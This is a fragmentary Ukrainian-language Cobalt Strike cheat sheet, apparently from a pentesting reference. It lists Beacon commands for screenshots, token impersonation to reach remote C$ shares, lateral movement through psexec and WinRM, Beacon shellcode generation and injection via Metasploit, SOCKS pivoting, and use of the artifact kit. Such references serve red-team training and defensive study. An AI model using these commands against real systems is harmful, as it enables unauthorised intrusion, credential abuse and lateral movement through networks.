...
# Знімки екрана
printscreen    # Зробити один знімок екрана за допомогою методу PrintScr
screenshot     # Зробити один знімок екрана
screenwatch    # Зробити періодичні знімки екрана робочого столу
...
## З документації API ми знаємо, що цей тип входу "дозволяє виклику клонувати свій поточний токен". Ось чому вивід Beacon говорить Impersonated &#x3C;current_username> - він імітує наш власний клонований токен.
ls \\computer_name\c$ # Спробуйте використовувати згенерований токен для доступу до C$ на комп'ютері
...
## Записати квиток на машину зловмисника з сеансу poweshell &#x26; завантажити його
...
## psexec_psh                x86   Використати службу для запуску однолінійного скрипту PowerShell
## winrm                     x86   Запустити скрипт PowerShell через WinRM
## winrm64                   x64   Запустити скрипт PowerShell через WinRM

remote-exec [method] [target] [command]
## Methods:
<strong>## psexec                          Віддалене виконання через Менеджер керування службами
...
## Згенеруйте stageless Beacon shellcode, перейдіть до Attacks > Packages > Windows Executable (S), виберіть бажаного слухача, виберіть Raw як тип виходу та виберіть Use x64 payload.
## Використовуйте post/windows/manage/shellcode_inject у metasploit, щоб впровадити згенерований shellcode cobalt strike.


# Pivoting
## Відкрийте сокс-проксі на teamserver
beacon> socks 1080
...
Зазвичай у `/opt/cobaltstrike/artifact-kit` ви можете знайти код і попередньо скомпільовані шаблони (у `/src-common`) артефактів, які cobalt strike буде використовувати для генерації бінарних маяків.
